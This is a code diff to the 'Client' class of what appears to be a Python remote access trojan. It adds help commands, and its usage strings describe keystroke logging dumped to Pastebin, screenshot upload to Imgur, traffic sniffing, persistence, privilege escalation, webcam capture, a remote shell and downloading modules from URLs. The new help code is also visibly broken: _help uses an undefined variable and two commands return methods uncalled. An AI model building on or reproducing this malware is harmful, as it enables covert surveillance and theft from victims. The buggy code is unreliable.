@@ -97,6 +97,42 @@ class Client(object):
         self._commands   = {cmd: getattr(self, cmd) for cmd in __command__}
         self._result     = self._get_result()
 
+# ------------------- usage help -------------------------
+
+    def _help(self): return getattr(self, target).usage if target in self._commands else "'{}' not found".format(target)
+    
+    def _help_modules(self): return self._show({mod: self._modules[mod].status for mod in self._modules})
+
+    def _help_commands(self): return self._show({cmd: self._commands[cmd].usage for cmd in self._commands})
+
+    def _usage(self):
+        self.ls.usage               = "usage:         ls <path>\ndescription:   list directory contents"
+        self.cd.usage               = "usage:         cd <path>\ndescription:   change directory"
+        self.set.usage              = "usage:         set <module> [option]=[value]\ndescription:   set module option"
+        self.new.usage              = "usage:         new <url>\ndescription:   download new module from url"
+        self.run.usage              = "usage:         run\ndescription:   run enabled client modules"
+        self.pwd.usage              = "usage:         pwd \ndescription:   present working directory"
+        self.jobs.usage             = "usage:         jobs\ndescription:   list currently active jobs"
+        self.kill.usage             = "usage:         kill\ndescription:   kill client"
+        self.show.usage             = "usage:         show <option>\ndescription:   show client attributes"
+        self.wget.usage             = "usage:         wget <url>\ndescription:   download file from url"
+        self.admin.usage            = "usage:         admin\ndescription:   attempt to escalate privileges"
+        self.shell.usage            = "usage:         shell\ndescription:   run client shell "
+        self.start.usage            = "usage:         start\ndescription:   start client"
+        self.webcam.usage           = "usage:         webcam\ndescription:   remote image/video capture from client webcam"
+        self.enable.usage           = "usage:         enable <module>\ndescription:   enable module"
+        self.standby.usage          = "usage:         standby\ndescription:    revert to standby mode"
+        self.options.usage          = "usage:         options\ndescription:   display module options"
+        self.disable.usage          = "usage:         disable <module>\ndescription:   disable module"
+        self.results.usage          = "usage:         results\ndescription:   show all modules output"
+        self.commands.usage         = "usage:         commands\ndescription:   list commands with descriptions"
+        self.keylogger.usage        = "usage:         keylogger\ndescription:   log client keystrokes remotely + dump to Pastebin"
+        self.screenshot.usage       = "usage:         screenshot\ndescription:   take screenshot + upload to Imgur"
+        self.persistence.usage      = "usage:         persistence\ndescription:   establish persistence to relaunch on reboot"
+        self.packetsniffer.usage    = "usage:         packetsniffer\ndescription:   capture client network traffic + dump to Pastebin"
+
+# ------------------- private functions -------------------------
+
     def _wget(self, target): return urlretrieve(target)[0]
     
     def _cat(self,filename): return open(filename).read(4000) 
@@ -564,32 +600,6 @@ class Client(object):
             if self.__v__:
                 print "Error: '{}'".format(str(e))
 
-    def _usage(self):
-        self.ls.usage               = "usage:         ls <path>\ndescription:   list directory contents"
-        self.cd.usage               = "usage:         cd <path>\ndescription:   change directory"
-        self.set.usage              = "usage:         set <module> [option]=[value]\ndescription:   set module option"
-        self.new.usage              = "usage:         new <url>\ndescription:   download new module from url"
-        self.run.usage              = "usage:         run\ndescription:   run enabled client modules"
-        self.pwd.usage              = "usage:         pwd \ndescription:   present working directory"
-        self.jobs.usage             = "usage:         jobs\ndescription:   list currently active jobs"
-        self.kill.usage             = "usage:         kill\ndescription:   kill client"
-        self.show.usage             = "usage:         show <option>\ndescription:   show client attributes"
-        self.wget.usage             = "usage:         wget <url>\ndescription:   download file from url"
-        self.admin.usage            = "usage:         admin\ndescription:   attempt to escalate privileges"
-        self.shell.usage            = "usage:         shell\ndescription:   run client shell "
-        self.start.usage            = "usage:         start\ndescription:   start client"
-        self.webcam.usage           = "usage:         webcam\ndescription:   remote image/video capture from client webcam"
-        self.enable.usage           = "usage:         enable <module>\ndescription:   enable module"
-        self.standby.usage          = "usage:         standby\ndescription:    revert to standby mode"
-        self.options.usage          = "usage:         options\ndescription:   display module options"
-        self.disable.usage          = "usage:         disable <module>\ndescription:   disable module"
-        self.results.usage          = "usage:         results\ndescription:   show all modules output"
-        self.commands.usage         = "usage:         commands\ndescription:   list commands with descriptions"
-        self.keylogger.usage        = "usage:         keylogger\ndescription:   log client keystrokes remotely + dump to Pastebin"
-        self.screenshot.usage       = "usage:         screenshot\ndescription:   take screenshot + upload to Imgur"
-        self.persistence.usage      = "usage:         persistence\ndescription:   establish persistence to relaunch on reboot"
-        self.packetsniffer.usage    = "usage:         packetsniffer\ndescription:   capture client network traffic + dump to Pastebin"
-
 # ------------------- keylogger -------------------------
 
     def _keylogger_event(self, event):
@@ -1024,18 +1034,18 @@ class Client(object):
 
     @_command
     def results(self): return self._show(self._result)
-    
+
+    @_command
+    def help(self, target): return self._help(target)
+
     @_command
     def info(self): return self._show(self._info, indent=2, separators=(',','\t'))
 
     @_command
-    def commands(self): return self._show({cmd for cmd in self._commands: self._commands[cmd].usage})
+    def commands(self): return self._help_commands 
 
     @_command
-    def modules(self): return self._show({mod for mod in self._modules: self._modules[mod].status})
-
-
-# ------------------- modules -------------------------
+    def modules(self): return self._help_modules 
 
     @_module
     def webcam(self): return self._webcam()
